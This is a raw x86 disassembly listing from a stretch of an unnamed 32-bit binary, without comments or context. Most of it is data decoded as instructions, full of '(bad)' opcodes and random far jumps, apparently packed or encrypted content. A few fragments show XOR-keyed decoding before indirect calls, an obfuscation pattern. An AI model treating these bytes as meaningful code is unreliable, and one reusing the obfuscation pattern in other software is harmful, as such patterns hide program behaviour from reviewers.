  402945:	fistp  QWORD PTR [eax+0x28]
  402948:	dec    ecx
  402949:	call   0xcd455a58
  40294e:	adc    BYTE PTR [edi-0x21036476],ch
  402954:	out    0x57,al
  402956:	push   ecx
  402957:	adc    al,0x1a
  402959:	dec    eax
  40295a:	cli    
  40295b:	test   BYTE PTR [ebx],cl
  40295d:	jg     0x40293d
  40295f:	push   esi
  402960:	push   cs
  402961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402962:	test   BYTE PTR [ecx+0x6b],dh
  402965:	shr    bl,0x61
  402968:	(bad)  
  402969:	fild   WORD PTR [ecx+0x68]
  40296c:	call   0x7b1fb37c
  402971:	cld    
  402972:	jmp    0xd9d5:0xc3940036
  402979:	xchg   edx,eax
  40297a:	xor    ebx,DWORD PTR [edi]
  40297c:	mov    DWORD PTR [ebp+0x3fc7b4f5],edx
  402982:	jo     0x4029f6
  402984:	scas   eax,DWORD PTR es:[edi]
  402985:	mov    al,ds:0xee3c31c0
  40298a:	int    0x29
  40298c:	inc    ebp
  40298d:	jmp    0x402928
  40298f:	jo     0x4029f3
  402991:	cwde   
  402992:	xchg   esi,eax
  402993:	pop    edi
  402994:	jmp    0x402921
  402996:	cmp    eax,0x633b8d8c
  40299b:	sbb    eax,0x26100f92
  4029a0:	inc    ebp
  4029a1:	add    al,0xf0
  4029a3:	(bad)  
  4029a4:	jmp    0xed9a:0xf7d2004c
  4029ab:	sbb    eax,0x73635f24
  4029b0:	bnd jns 0x4029bb
  4029b3:	jge    0x402944
  4029b5:	loop   0x40296a
  4029b7:	xchg   edi,eax
  4029b8:	mov    fs,WORD PTR [ebx-0x7b]
  4029bb:	ins    DWORD PTR es:[edi],dx
  4029bc:	sbb    eax,0x17c67ceb
  4029c1:	imul   esp,DWORD PTR [edx-0x40],0x49
  4029c5:	sub    DWORD PTR [ebx],esi
  4029c7:	adc    al,0x9d
  4029c9:	and    cl,BYTE PTR [ecx-0x3d635165]
  4029cf:	dec    edx
  4029d0:	(bad)  
  4029d1:	mov    ebp,0x1c07bc00
  4029d6:	jo     0x4029b2
  4029d8:	(bad)  
  4029d9:	cmp    DWORD PTR [esi+0x6541df7],edx
  4029df:	(bad)  
  4029e0:	rol    BYTE PTR [ecx+ebx*8],1
  4029e3:	fisub  DWORD PTR [ebx+0x731abe9]
  4029e9:	call   0xadf5cc2f
  4029ee:	sub    BYTE PTR [ebx+0x5a988267],dl
  4029f4:	mov    BYTE PTR [edx+0x26b8a0b7],al
  4029fa:	xchg   BYTE PTR [ecx],al
  4029fc:	xor    BYTE PTR [eax],cl
  4029fe:	push   ss
  4029ff:	sub    bh,cl
  402a01:	mov    al,ds:0x5e502d7f
  402a06:	sahf   
  402a07:	push   ebp
  402a08:	retf   
  402a09:	mov    edi,0x1738c8e0
  402a0e:	push   ebp
  402a0f:	cdq    
  402a10:	loop   0x402a68
  402a12:	sti    
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	mov    eax,ds:0xaa386690
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	xor    ebp,edi
  402a42:	les    edi,FWORD PTR [esp+eax*1-0x4a449fba]
  402a49:	sub    eax,0x90aadb93
  402a4e:	push   ebp
  402a4f:	int3   
  402a50:	jle    0x4029f7
  402a52:	int    0xf9
  402a54:	mov    cs,esi
  402a56:	sahf   
  402a57:	mov    ah,0xf9
  402a59:	cmp    bh,ah
  402a5b:	arpl   WORD PTR ds:0x14b6294c,di
  402a61:	addr16 jl 0x402a48
  402a64:	into   
  402a65:	xchg   ebx,eax
  402a66:	mov    dh,0xee
  402a68:	push   cs
  402a69:	ret    0x829e
  402a6c:	enter  0x2c32,0x3e
  402a70:	mov    edx,0xec7da5a1
  402a75:	and    eax,0xf308e413
  402a7a:	cdq    
  402a7b:	cli    
  402a7c:	rcl    al,0x80
  402a7f:	popa   
  402a80:	popf   
  402a81:	lock add ah,dl
  402a84:	jo     0x402a18
  402a86:	dec    esp
  402a87:	adc    ebp,DWORD PTR es:[ebx+0x17]
  402a8b:	stc    
  402a8c:	mov    edx,0x2be1dab3
  402a91:	push   cs
  402a92:	(bad)  
  402a93:	retf   
  402a94:	pop    edx
  402a95:	not    DWORD PTR [eax]
  402a97:	(bad)  
  402a98:	push   0x12
  402a9a:	in     al,0x4
  402a9c:	popf   
  402a9d:	jg     0x402a51
  402a9f:	lea    edx,[ebp+0x1c]
  402aa2:	inc    edi
  402aa3:	mov    dh,0x32
  402aa5:	push   ds
  402aa6:	push   esp
  402aa7:	gs xor edx,0x3559817a
  402aae:	xlat   BYTE PTR ds:[ebx]
  402aaf:	xor    BYTE PTR [esp+ebp*2-0x2e],0x0
  402ab4:	pop    esp
  402ab5:	arpl   WORD PTR [eax+0x76],si
  402ab8:	push   ebp
  402ab9:	sbb    al,0x16
  402abb:	aam    0x36
  402abd:	shr    DWORD PTR [edx],0x66
  402ac0:	sbb    al,0x48
  402ac2:	repz mov esp,0xbb166fbf
  402ac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ac9:	fisub  DWORD PTR [eax-0x28b753e3]
  402acf:	dec    ebp
  402ad0:	pushfw 
  402ad2:	xor    esi,edx
  402ad4:	and    eax,0x66dcd6fa
  402ad9:	icebp  
  402ada:	add    esp,DWORD PTR [esi+0x30]
  402add:	sbb    al,BYTE PTR [ebx]
  402adf:	jmp    DWORD PTR [ebp-0x7ad816ee]
  402ae5:	fisttp WORD PTR [esi]
  402ae7:	div    ah
  402ae9:	fcomp  DWORD PTR [edi-0x33698e89]
  402aef:	(bad)
  402af2:	or     BYTE PTR [edi+0x6e76e9d5],0xfc
  402af9:	test   eax,0x30f50e4e
  402afe:	cmp    BYTE PTR [ebx+0x1418260b],dh
  402b04:	cmp    BYTE PTR [ecx+esi*4-0x14],dh
  402b08:	pop    ss
  402b09:	das    
  402b0a:	xchg   esi,eax
  402b0b:	cld    
  402b0c:	jl     0x402ab3
  402b0e:	shl    BYTE PTR [esi-0x19abcb0c],1
  402b14:	mov    ds:0xc03cfa00,al
  402b19:	mov    ds:0x48f28873,al
  402b1e:	ins    DWORD PTR es:[edi],dx
  402b1f:	push   0xe43b5888
  402b24:	or     al,0x52
  402b26:	ss in  al,dx
  402b28:	mov    eax,0x28e9e23f
  402b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b2e:	xor    DWORD PTR [edi+0x5176962b],0xa599ccae
  402b38:	mov    dh,0x2a
  402b3a:	and    esp,DWORD PTR [ecx]
  402b3c:	and    cl,BYTE PTR [eax+0x70686a9a]
  402b42:	fs pop esi
  402b44:	or     BYTE PTR [edx-0x699bacb6],dl
  402b4a:	add    eax,0x774d2cd3
  402b4f:	or     edi,DWORD PTR [edx+0x3d]
  402b52:	sub    BYTE PTR [edx],al
  402b54:	add    DWORD PTR [edx+0x6],ebp
  402b57:	call   0x35c3:0x23def4d0
  402b5e:	xlat   BYTE PTR ds:[ebx]
  402b5f:	pop    eax
  402b60:	cmp    eax,0xad1fff22
  402b65:	push   ss
  402b66:	pop    ds
  402b67:	xchg   esi,eax
  402b68:	sub    al,0x30
  402b6a:	inc    edi
  402b6b:	call   0xd1066e8b
  402b70:	inc    esp
  402b71:	sub    al,0x89
  402b73:	hlt    
  402b74:	jns    0x402bcc
  402b76:	dec    edi
  402b77:	js     0x402bad
  402b79:	clc    
  402b7a:	stc    
  402b7b:	pop    ebp
  402b7c:	pop    ds
  402b7d:	adc    edi,DWORD PTR [edx]
  402b7f:	ja     0x402b61
  402b81:	and    BYTE PTR [ebx-0x62593902],bl
  402b87:	xor    eax,0x4b8aed15
  402b8c:	stos   BYTE PTR es:[edi],al
  402b8d:	fmul   st,st(7)
  402b8f:	mov    ebp,0x11179ac7
  402b94:	pop    edx
  402b95:	out    0x87,al
  402b97:	stc    
  402b98:	(bad)  
  402b99:	pop    esp
  402b9a:	adc    ecx,DWORD PTR [esi+0x643e7404]
  402ba0:	adc    BYTE PTR [ecx-0x5b17cb39],cl
  402ba6:	cmp    al,0xd8
  402ba8:	xlat   BYTE PTR ds:[ebx]
  402ba9:	daa    
  402baa:	pop    edi
  402bab:	adc    DWORD PTR [edi-0x6c],esp
  402bae:	pushf  
  402baf:	repz lds esi,FWORD PTR [ebp-0x42]
  402bb3:	sub    DWORD PTR [edi-0x49],edi
  402bb6:	pop    ebp
  402bb7:	(bad)  [edx]
  402bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bba:	adc    DWORD PTR [esp+ecx*8+0x6b],ecx
  402bbe:	xchg   edi,eax
  402bbf:	and    DWORD PTR [ecx+0x1f],ebx
  402bc2:	mov    edi,es
  402bc4:	test   eax,eax
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	xchg   BYTE PTR [edi-0x1],ah
  402c14:	jg     0x402c4c
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c4d
  402c1e:	jne    0x402bf9
  402c20:	hlt    
  402c21:	ja     0x402bb1
  402c23:	(bad)  
  402c25:	jmp    0x402c51
  402c27:	adc    ah,cl
  402c29:	mov    eax,DWORD PTR [edx+0x7e]
  402c2c:	js     0x402c5d
  402c2e:	test   eax,esi
  402c30:	add    ch,BYTE PTR [edi]
  402c32:	std    
  402c33:	outs   dx,BYTE PTR ds:[esi]
  402c34:	cmp    eax,DWORD PTR [edx]
  402c36:	adc    ecx,DWORD PTR [edi-0x23]
  402c39:	cwde   
  402c3a:	dec    ebp
  402c3b:	mov    bh,BYTE PTR [edi+0x7ba10c]
  402c41:	jle    0x402c72
  402c43:	(bad)
  402c46:	es ins BYTE PTR es:[edi],dx
  402c48:	mov    BYTE PTR [eax],bl
  402c4a:	stc    
  402c4b:	scas   al,BYTE PTR es:[edi]
  402c4c:	les    esp,FWORD PTR [ecx+0x3e6ace47]
  402c52:	inc    ebx
  402c53:	pop    ebp
  402c54:	xchg   esi,eax
  402c55:	shl    DWORD PTR [edx+0x7c285565],0x7c
  402c5c:	pop    esi
  402c5d:	dec    esp
  402c5e:	xchg   edi,eax
  402c5f:	or     edx,DWORD PTR ds:0x2747a4c8
  402c65:	sub    al,0xb3
  402c67:	lahf   
  402c68:	jmp    0x402c3d
  402c6a:	jo     0x402c02
  402c6c:	lock dec ebp
  402c6e:	fmul   DWORD PTR ds:0x7b8189a1
  402c74:	cli    
  402c75:	sbb    ecx,DWORD PTR [eax]
  402c77:	jne    0x402c1d
  402c79:	in     al,0xb3
  402c7b:	cmovb  esp,DWORD PTR [ebp+0x40e672f1]
  402c82:	mov    DWORD PTR [ecx+eax*1],ebp
  402c85:	(bad)  
  402c86:	aaa    
  402c87:	lds    esi,FWORD PTR [ecx]
  402c89:	mov    edx,0xbcd65e24
  402c8e:	aaa    
  402c8f:	repz ret 
  402c91:	sbb    dl,BYTE PTR [esi]
  402c93:	sbb    BYTE PTR [eax],dh
  402c95:	mov    ds:0x1b3524f1,al
  402c9a:	into   
  402c9b:	mov    ds:0x6d9390d9,ax
  402ca1:	add    DWORD PTR [edi],0x7c42232d
  402ca7:	adc    BYTE PTR [eax+0x9],0x44
  402cab:	scas   al,BYTE PTR es:[edi]
  402cac:	out    dx,al
  402cad:	std    
  402cae:	cmp    eax,DWORD PTR [ebx+0x6b]
  402cb1:	xchg   esi,eax
  402cb2:	or     BYTE PTR [ebx],al
  402cb4:	inc    ebx
  402cb5:	ins    BYTE PTR es:[edi],dx
  402cb6:	ret    
  402cb7:	movups XMMWORD PTR [esi+ebx*4+0x9],xmm3
  402cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cbd:	cmp    BYTE PTR [edi-0x3f],dl
  402cc0:	push   esp
  402cc1:	lods   eax,DWORD PTR ds:[esi]
  402cc2:	push   0xffffffc3
  402cc4:	and    BYTE PTR [eax+ecx*4-0x1b],dl
  402cc8:	ja     0x402c7c
  402cca:	mov    al,ds:0x24f2a4d3
  402ccf:	jl     0x402cc3
  402cd1:	xchg   edx,eax
  402cd2:	add    ebx,ebp
  402cd4:	mov    DWORD PTR [edi-0x210041fc],eax
  402cda:	shr    DWORD PTR [ecx+eax*4],cl
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jo     0x402ca3
  402ce0:	mov    eax,0x10112e70
  402ce5:	rcr    DWORD PTR [edx],0x9c
  402ce8:	fstp   QWORD PTR ss:[eax-0x3706ee26]
  402cef:	pop    ds
  402cf0:	push   ecx
  402cf1:	int3   
  402cf2:	in     al,0xbd
  402cf4:	adc    dh,bl
  402cf6:	cli    
  402cf7:	(bad)  [edi+0x26]
  402cfa:	mov    eax,ds:0x98d810a5
  402cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d00:	jne    0x402d3b
  402d02:	popa   
  402d03:	push   es
  402d04:	hlt    
  402d05:	loopne 0x402ccc
  402d07:	clc    
  402d08:	enter  0xae15,0x20
  402d0c:	inc    esp
  402d0d:	(bad)  
  402d0e:	pop    ebx
  402d0f:	xor    DWORD PTR [edi+ecx*2-0xc645fb1],esp
  402d16:	lahf   
  402d17:	call   DWORD PTR [edi+0x7f]
  402d1a:	test   DWORD PTR [ebp-0x62],esp
  402d1d:	mov    BYTE PTR ds:0x56f7138,ah
  402d23:	imul   esi,DWORD PTR ss:[eax],0x62
  402d27:	scas   eax,DWORD PTR es:[edi]
  402d28:	sub    al,BYTE PTR [esi]
  402d2a:	xchg   esi,eax
  402d2b:	test   eax,0xf5f3110c
  402d30:	iret   
  402d31:	in     al,0xed
  402d33:	arpl   di,sp
  402d35:	iret   
  402d36:	dec    esp
  402d37:	xchg   ebp,eax
  402d38:	inc    esp
  402d39:	sbb    eax,0x51809df7
  402d3e:	add    DWORD PTR [edx-0x5],0xffffffd3
  402d42:	lea    esp,[ecx]
  402d44:	test   DWORD PTR [ebp-0xb],edx
  402d47:	dec    ecx
  402d48:	pop    ss
  402d49:	jl     0x402ceb
  402d4b:	(bad)  
  402d4c:	pop    eax
  402d4d:	pop    eax
  402d4e:	mov    edx,0x9d0b1f40
  402d53:	nop
  402d54:	cmp    ebp,ebx
  402d56:	out    0x59,al
  402d58:	push   0x99345485
  402d5d:	outs   dx,BYTE PTR ds:[esi]
  402d5e:	cli    
  402d5f:	sub    eax,0xc57f9b79
  402d64:	jge    0x402db2
  402d66:	sahf   
  402d67:	aaa    
  402d68:	mov    DWORD PTR [ebx],esp
  402d6a:	mov    bh,0x66
  402d6c:	cwde   
  402d6d:	pop    eax
  402d6e:	and    BYTE PTR [eax-0x34f16b8b],cl
  402d74:	sahf   
  402d75:	inc    edi
  402d76:	leave  
  402d77:	out    dx,eax
  402d78:	sbb    eax,DWORD PTR [ebx+0x17]
  402d7b:	jle    0x402d8e
  402d7d:	fild   WORD PTR [esi+0x43]
  402d80:	(bad)  
  402d81:	icebp  
  402d82:	sub    ah,BYTE PTR gs:[ecx+0x203ffb80]
  402d89:	pushf  
  402d8a:	les    edx,FWORD PTR [edx+ecx*8-0x7c]
  402d8e:	fwait
  402d8f:	jle    0x402e04
  402d91:	pop    edx
  402d92:	int3   
  402d93:	pop    ds
  402d94:	retf   
  402d95:	jle    0x402d1d
  402d97:	mov    al,ds:0x71da7186
  402d9c:	cmp    BYTE PTR [ecx-0x55],al
  402d9f:	(bad)  
  402da0:	jne    0x402dcd
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebp+esi*4-0x8],1
  402de7:	ins    BYTE PTR es:[edi],dx
  402de8:	add    al,0xb2
  402dea:	or     BYTE PTR [esi+0x7e],bh
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402d8f
  402df2:	pop    ecx
  402df3:	jnp    0x402e20
  402df5:	(bad)  
  402df6:	xchg   esi,eax
  402df7:	xchg   esi,eax
  402df8:	mov    edx,0x85110f50
  402dfd:	(bad)  
  402dfe:	and    eax,0x83d23085
  402e03:	and    ch,dl
  402e05:	xchg   edi,eax
  402e06:	inc    esp
  402e07:	pushf  
  402e08:	retf   0x3437
  402e0b:	es in  al,dx
  402e0d:	adc    ebx,ecx
  402e0f:	dec    eax
  402e10:	ret    
  402e11:	pop    esi
  402e12:	mov    esi,0x4afd1eec
  402e17:	nop
  402e18:	adc    edx,DWORD PTR [edx-0x4bf4b818]
  402e1e:	pop    ecx
  402e1f:	sahf   
  402e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e21:	mov    ch,0x9e
  402e23:	mov    ds:0x176aea23,al
  402e28:	gs ret 0x4e1e
  402e2c:	ficom  DWORD PTR [ebx]
  402e2e:	cmp    ecx,DWORD PTR [ebp-0x25bacd4b]
  402e34:	test   al,0x78
  402e36:	call   0x4c2f172e
  402e3b:	icebp  
  402e3c:	stos   DWORD PTR es:[edi],eax
  402e3d:	pop    edx
  402e3e:	mov    ah,dh
  402e40:	lds    esi,FWORD PTR [ebx-0x271fcf4d]
  402e46:	test   BYTE PTR [edi],ah
  402e48:	je     0x402e09
  402e4a:	mov    al,ds:0xbed20b18
  402e4f:	ins    WORD PTR es:[edi],dx
  402e51:	outs   dx,DWORD PTR ds:[esi]
  402e52:	or     eax,0x91e553d2
  402e57:	or     dh,0x29
  402e5a:	ins    BYTE PTR es:[edi],dx
  402e5b:	sbb    DWORD PTR ds:0x7b64f02b,esp
  402e61:	sar    bh,cl
  402e63:	sub    ebp,ebx
  402e65:	iret   
  402e66:	cmp    al,0x63
  402e68:	sbb    al,0x45
  402e6a:	jge    0x402ec4
  402e6c:	jle    0x402ee3
  402e6e:	add    BYTE PTR [ecx+0x5e],bh
  402e71:	bound  esi,QWORD PTR [edi+0x4b6c3f45]
  402e77:	js     0x402e15
  402e79:	mov    esi,DWORD PTR [edi+0x44db7249]
  402e7f:	jecxz  0x402e82
  402e81:	xor    DWORD PTR [ebx-0x441ae646],ebx
  402e87:	les    ebp,FWORD PTR [ebx]
  402e89:	adc    esi,edi
  402e8b:	push   eax
  402e8c:	arpl   WORD PTR ds:0xd5fd4940,si
  402e92:	lea    ebx,ds:0xfb6efb0a
  402e98:	aas    
  402e99:	imul   eax,DWORD PTR [eax-0x7d],0x7807b9aa
  402ea0:	(bad)  
  402ea1:	les    ebx,FWORD PTR [ebx]
  402ea3:	pop    ds
  402ea4:	or     BYTE PTR [ebp+0xfe5d810],al
  402eaa:	dec    ebx
  402eab:	mov    al,0x4a
  402ead:	sbb    ah,BYTE PTR [ebx+0x16]
  402eb0:	xor    DWORD PTR [ecx+0x2fec2a32],ebp
  402eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb7:	or     esi,DWORD PTR [ebp-0x373ba270]
  402ebd:	retf   
  402ebe:	pop    edi
  402ebf:	mov    ah,0xf7
  402ec1:	mov    bl,0x4c
  402ec3:	sub    al,0x90
  402ec5:	sub    DWORD PTR [ebx+0x4a],edx
  402ec8:	dec    ebx
  402ec9:	int3   
  402eca:	(bad)  
  402ecb:	lock jl 0x402ee4
  402ece:	push   esi
  402ecf:	je     0x402ea2
  402ed1:	xor    al,0x55
  402ed3:	lahf   
  402ed4:	daa    
  402ed5:	loop   0x402e9d
  402ed7:	xor    BYTE PTR [esi-0x32],bl
  402eda:	pop    edi
  402edb:	jl     0x402f2d
  402edd:	es pop es
  402edf:	pusha  
  402ee0:	adc    eax,0x1d43899
  402ee5:	adc    eax,0xdcf660c9
  402eea:	rcl    BYTE PTR [eax+0x6c],cl
  402eed:	jmp    0xc7cf:0x29598a92
  402ef4:	jne    0x402ef7
  402ef6:	mov    esi,0x873ad9cf
  402efb:	pop    ss
  402efc:	inc    edi
  402efd:	pop    eax
  402efe:	inc    ecx
  402eff:	fadd   DWORD PTR [ebp-0x7de72921]
  402f05:	pop    ss
  402f06:	int3   
  402f07:	jns    0x402efb
  402f09:	popa   
  402f0a:	jp     0x402efb
  402f0c:	out    0x8a,eax
  402f0e:	xchg   esi,eax
  402f0f:	lahf   
  402f10:	sti    
  402f11:	stos   DWORD PTR es:[edi],eax
  402f12:	mov    ds:0x6e828698,eax
  402f17:	stos   DWORD PTR es:[edi],eax
  402f18:	adc    al,0xbf
  402f1a:	stc    
  402f1b:	xor    bl,bh
  402f1d:	cmp    BYTE PTR [esi],dh
  402f1f:	mov    ds:0xe3cb45bc,al
  402f24:	mov    bl,0x81
  402f26:	stos   DWORD PTR es:[edi],eax
  402f27:	lock stc 
  402f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f2a:	ss pop ecx
  402f2c:	mov    edi,0xad8ce29f
  402f31:	rcl    BYTE PTR [edx],cl
  402f33:	sti    
  402f34:	cli    
  402f35:	push   cs
  402f36:	pushf  
  402f37:	cmp    eax,0x62eddff2
  402f3c:	cs xchg ecx,eax
  402f3e:	fimul  WORD PTR [edx-0x1f6bd3a1]
  402f44:	xchg   ebx,eax
  402f45:	mov    ds:0x838425ce,al
  402f4a:	pop    esp
  402f4b:	mov    dh,0x2a
  402f4d:	mov    eax,0x4dbe23c0
  402f52:	fwait
  402f53:	mov    BYTE PTR [edi-0x5c],al
  402f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f57:	test   DWORD PTR [edx],edx
  402f59:	ficomp WORD PTR [ebx+0x7e]
  402f5c:	mov    esp,0xcc43bc46
  402f61:	fldenv [eax]
  402f63:	mov    esp,0x3604cf9a
  402f68:	mov    ah,0x8d
  402f6a:	idiv   DWORD PTR [ebx+edx*2+0x2d]
  402f6e:	add    esi,esi
  402f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f71:	aad    0x38
  402f73:	daa    
  402f74:	test   eax,0x3c0c058d
  402f79:	inc    ecx
  402f7a:	add    bh,bh
  402f7c:	xor    BYTE PTR [ebp+0x4139b805],cl
  402f82:	add    bh,bh
  402f84:	xor    BYTE PTR [ebp+0x413bec05],cl
  402f8a:	add    bh,bh
  402f8c:	xor    BYTE PTR [ebp+0x413d3405],cl
  402f92:	add    bh,bh
  402f94:	xor    BYTE PTR [edi+0x534343d3],al
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x35b2a5b7]
  402fae:	lahf   
  402faf:	xchg   esi,eax
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fb4
  402fb9:	ja     0x402ff3
  402fbb:	jne    0x403026
  402fbd:	ins    DWORD PTR es:[edi],dx
  402fbe:	scas   eax,DWORD PTR es:[edi]
  402fbf:	iret   
  402fc0:	ret    0x51fe
  402fc3:	pop    ebp
  402fc4:	mov    edi,DWORD PTR [esi]
  402fc6:	dec    edx
  402fc7:	ins    DWORD PTR es:[edi],dx
  402fc8:	mov    ebp,DWORD PTR [edx]
  402fca:	jp     0x402f7e
  402fcc:	xchg   ebx,eax
  402fcd:	in     al,0xb5
  402fcf:	add    BYTE PTR [ebx],al
  402fd1:	popa   
  402fd2:	xchg   ebp,eax
  402fd3:	mov    esp,0x994f7951
  402fd8:	cli    
  402fd9:	pusha  
  402fda:	rcr    DWORD PTR [ecx-0x3995b0e2],1
  402fe0:	adc    BYTE PTR [edi-0x3c3a21c8],cl
  402fe6:	pop    edi
  402fe7:	out    dx,eax
  402fe8:	sub    al,0xc5
  402fea:	js     0x403068
  402fec:	lock shl BYTE PTR [esi+0x59c900e1],0x6
  402ff4:	and    eax,0x327f688a
  402ff9:	fldcw  WORD PTR [edx]
  402ffb:	cmc    
  402ffc:	xchg   edi,eax
  402ffd:	xor    DWORD PTR [ebx],esi
  402fff:	xchg   BYTE PTR [ebx],bh
  403001:	sub    BYTE PTR [edi-0x57350d47],0x20
  403008:	arpl   WORD PTR [edx+0x9],si
  40300b:	adc    BYTE PTR [ebx],0x6f
  40300e:	cs pop ecx
  403010:	stos   DWORD PTR es:[edi],eax
  403011:	push   eax
  403012:	jne    0x403010
  403014:	xchg   esi,eax
  403015:	inc    esp
  403016:	(bad)  
  403017:	sar    BYTE PTR [ebx-0x1a4ecbe5],cl
  40301d:	xadd   BYTE PTR [ebp-0x1135ac10],dh
  403024:	aaa    
  403025:	xor    ch,0x16
  403028:	pop    ebp
  403029:	mov    ds:0xe047e222,eax
  40302e:	neg    DWORD PTR [ebp-0x67c7a0b9]
  403034:	jmp    0xdb1e1215
  403039:	retf   
  40303a:	imul   ecx,DWORD PTR [esi+eax*8+0x1],0x822e4771
  403042:	scas   al,BYTE PTR es:[edi]
  403043:	inc    esp
  403044:	out    0x2c,eax
  403046:	dec    edi
  403047:	das    
  403048:	cmc    
  403049:	out    dx,al
  40304a:	cli    
  40304b:	adc    DWORD PTR [eax+0x7],0x2f208e5b
  403052:	xchg   ebp,eax
  403053:	imul   edi,edi,0x721a69fa
  403059:	push   0xffffffd2
  40305b:	pusha  
  40305c:	inc    eax
  40305d:	test   bl,cl
  40305f:	inc    ebx
  403060:	sub    eax,DWORD PTR [ebx]
  403062:	sub    DWORD PTR [edi+ecx*8],ebp
  403065:	repz mov al,gs:0xe4fd7ef6
  40306c:	stos   DWORD PTR es:[edi],eax
  40306d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40306e:	rcl    dl,cl
  403070:	lods   al,BYTE PTR ds:[esi]
  403071:	daa    
  403072:	push   edx
  403073:	int3   
  403074:	cmp    eax,0x35244ea5
  403079:	mov    ebx,0xe017da48
  40307e:	dec    ecx
  40307f:	aad    0x19
  403081:	bsr    ebx,DWORD PTR gs:[ebp-0x7d]
  403086:	sbb    ah,BYTE PTR ds:0xedc28328
  40308c:	ds pop edx
  40308e:	bound  eax,QWORD PTR [eax-0x31]
  403091:	fisttp QWORD PTR [esi+edi*8-0x118040f0]
  403098:	fisttp DWORD PTR [eax+0x61d1dc39]
  40309e:	call   0x5d73:0x559da241
  4030a5:	cmp    al,0x88
  4030a7:	sub    al,0xf2
  4030a9:	adc    DWORD PTR [ebp+0x50c457a],ebx
  4030af:	and    eax,0xe135f4b6
  4030b4:	ins    BYTE PTR es:[edi],dx
  4030b5:	sub    cl,BYTE PTR [edi+0x61]
  4030b8:	pop    ebx
  4030b9:	add    eax,DWORD PTR [esp+eax*2+0x1b28d104]
  4030c0:	nop
  4030c1:	and    bh,BYTE PTR [edx]
  4030c3:	push   esi
  4030c4:	mov    ds:0x8f4d0dde,al
  4030c9:	jns    0x40311a
  4030cb:	(bad)  
  4030cc:	pop    ss
  4030cd:	je     0x40308c
  4030cf:	inc    edi
  4030d0:	repnz fistp DWORD PTR [ebp-0x10ac8f6]
  4030d7:	or     BYTE PTR [esi],0xc
  4030da:	out    dx,eax
  4030db:	adc    BYTE PTR [esi],dl
  4030dd:	fstp   TBYTE PTR [esp+esi*4-0x70a602c4]
  4030e4:	lds    esp,FWORD PTR [edx]
  4030e6:	fiadd  WORD PTR [ebx-0x5f]
  4030e9:	mov    ah,al
  4030eb:	mov    ah,0xa4
  4030ed:	cs iret 
  4030ef:	pop    ecx
  4030f0:	shr    bl,0x55
  4030f3:	xchg   ecx,eax
  4030f4:	jp     0x40314c
  4030f6:	call   0x9d612a10
  4030fb:	jno    0x4030e8
